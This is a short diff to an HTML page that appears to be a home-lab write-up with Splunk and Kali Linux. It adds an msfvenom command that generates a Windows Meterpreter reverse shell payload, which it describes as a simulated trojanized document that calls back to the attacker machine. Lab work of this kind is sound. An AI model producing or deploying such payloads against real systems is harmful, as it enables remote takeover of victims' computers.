@@ -34,4 +34,6 @@
   <li>8089/tcp (Splunkd management port)</li>
 </ul>
 
-<p>With this information, I moved on to crafting a reverse shell payload using msfvenom. The payload was configured to connect back to the Kali machine’s static IP, allowing full control of the victim upon execution.</p>
+<p>Next, I used msfvenom to generate a simple Meterpreter reverse shell payload:</p>
+<pre>msfvenom -p windows/x64/meterpreter/reverse_tcp</pre>
+<p>This executable simulates a trojanized document that, once opened, connects back to the Kali Linux attacker machine.</p>
